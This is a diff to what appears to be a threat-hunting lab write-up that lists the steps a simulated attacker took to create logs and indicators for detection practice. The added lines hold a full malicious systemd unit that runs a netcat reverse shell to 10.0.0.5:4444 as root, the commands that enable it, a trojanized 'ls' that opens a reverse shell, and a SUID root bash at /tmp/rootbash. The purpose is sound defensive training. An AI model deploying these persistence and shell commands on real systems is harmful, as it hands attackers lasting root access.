@@ -4,9 +4,30 @@
 
 ## Steps the "Bad Actor" took to Create Logs and IoCs:
 
-1. **Deployed a persistent backdoor by adding a malicious systemd service.**
-2. **Created a Trojanized script that mimics a common administrative `ls` command at `/home/baddog/.local/bin/ls` to execute a reverse shell.**
-3. **Created a SUID backdoor shell (`/tmp/rootbash`), modified its ownership, and set the SUID permission to escalate privileges.**
+1. Downloaded and installed a **malicious systemd service** to ensure the backdoor would automatically start on system reboot.
+- The service was configured to run a reverse shell or malicious command to maintain access after rebooting the system.
+
+`# Create a malicious systemd service that will ensure persistence by executing a reverse shell
+echo '[Unit]
+Description=Malicious Service
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c "nc -e /bin/bash 10.0.0.5 4444"
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target' > /etc/systemd/system/malicious.service
+
+# Enable and start the malicious service
+sudo systemctl enable malicious.service
+sudo systemctl start malicious.service`
+
+2. Replaced the legitimate `ls` command with a Trojanized script located at `/home/baddog/.local/bin/ls`.
+- This Trojanized script was designed to execute a reverse shell when invoked, providing continued access to the system without raising suspicion.
+3. **Created a backdoor shell at `/tmp/rootbash`, set the **SUID permission** on the shell (`chmod u+s /tmp/rootbash`), and made it executable by any user.
+- This backdoor shell was designed to escalate privileges and grant root access, regardless of the user executing
 
 ---
 
